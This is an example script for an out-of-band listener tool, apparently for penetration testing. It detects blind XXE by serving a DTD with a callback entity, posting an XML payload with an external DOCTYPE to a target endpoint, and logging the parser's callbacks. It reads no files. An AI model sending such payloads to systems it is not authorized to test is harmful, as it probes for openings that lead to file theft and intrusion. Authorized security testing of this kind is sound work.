"""
Blind XXE OOB detection — uses file.py with -d [[memory]] to serve a
malicious DTD via the serve_file() API.

The target's XML parser fetches the DTD from MOSS's file server.
The DTD triggers an HTTP callback back to MOSS (parameter entity OOB).

Flow:
  1. MOSS starts with -e file --file-memory; the DTD is loaded via
     server.serve_file()
  2. Sends an XXE payload referencing our external DTD
  3. The parser fetches the DTD  (first OOB interaction)
  4. The DTD's parameter entities trigger a second HTTP callback
  5. MOSS captures both callbacks

Usage:
    python examples/xxe_exfil.py --hostname your.public.ip --target http://target:8080

The --hostname must be reachable from the target server.
"""

import sys
import os
import argparse
import time

import httpx

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from moss.moss import MossBuilder


# ── Malicious DTD ───────────────────────────────────────────────────────────

DTD = """<!ENTITY %% callback SYSTEM "%s/dtd_fetched">
%%callback;
"""


def main():
    parser = argparse.ArgumentParser(
        description="Blind XXE OOB detection via file-hosted DTD",
    )
    parser.add_argument("--hostname", default="localhost",
                        help="Public hostname for DTD callback URL")
    parser.add_argument("--port", type=int, default=8000,
                        help="MOSS listen port")
    parser.add_argument("--target", default="http://localhost:9000",
                        help="Target URL (the vulnerable XML endpoint)")
    parser.add_argument("--timeout", type=int, default=30,
                        help="Seconds to wait for callbacks")
    args = parser.parse_args()

    callback_origin = f"http://{args.hostname}:{args.port}"

    # Step 1 ── Start MOSS with file.py + -d [[memory]] ─────────────────
    builder = MossBuilder(args=[
        "-p", str(args.port),
        "--hostname", args.hostname,
        "-e", "file",
        "-d", "[[memory]]",
    ])
    runner = builder.api()
    server = runner.servers[0]

    # Load the DTD into file.py's in-memory files
    dtd_content = DTD % callback_origin
    server.serve_file("oob.dtd", dtd_content, "text/plain")
    dtd_url = f"{callback_origin}/files/oob.dtd"

    print(f"DTD content:")
    for line in dtd_content.strip().splitlines():
        print(f"  {line}")
    print()
    print(f"DTD served at: {dtd_url}")
    print(f"OOB listener on {callback_origin}")
    print(f"Target: {args.target}")
    print()

    runner.serve()

    # Step 2 ── Craft the XXE payload ───────────────────────────────────
    xml_payload = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo SYSTEM "{dtd_url}">\n'
        "<stockCheck>\n"
        "  <productId>1</productId>\n"
        "  <storeId>1</storeId>\n"
        "</stockCheck>"
    )

    print("Sending XXE payload:")
    print(xml_payload)
    print()

    # Step 3 ── Send to target ──────────────────────────────────────────
    try:
        with httpx.Client(verify=False, timeout=15) as client:
            r = client.post(
                args.target.rstrip("/") + "/product/stock",
                content=xml_payload,
                headers={"Content-Type": "application/xml"},
            )
            print(f"Target response: {r.status_code} {r.text[:200].strip()}")
    except Exception as e:
        print(f"Request failed: {e}")
    print()

    # Step 4 ── Wait for OOB callbacks ─────────────────────────────────
    print(f"Waiting {args.timeout}s for OOB callbacks...")
    callbacks = []
    deadline = time.time() + args.timeout
    while time.time() < deadline:
        evt = server.wait(2.0)
        if evt is None:
            continue
        callbacks.append(evt)
        method = evt.get("method", "?")
        path = evt.get("path", "?")
        client = evt.get("client", "?")
        print(f"  <- OOB callback: {client} {method} {path}")

    print()

    # Step 5 ── Report ─────────────────────────────────────────────────
    print("--- Results ---")
    dtd_fetched = any("dtd_fetched" in e.get("path", "") for e in callbacks)
    if dtd_fetched:
        print("  [+] External DTD was fetched by the target!")
        print("      The target's XML parser loaded the DTD from the file extension.")
    else:
        print("  [-] No DTD fetch detected.")

    if callbacks:
        print(f"  Total callbacks received: {len(callbacks)}")

    runner.shutdown()


if __name__ == "__main__":
    main()
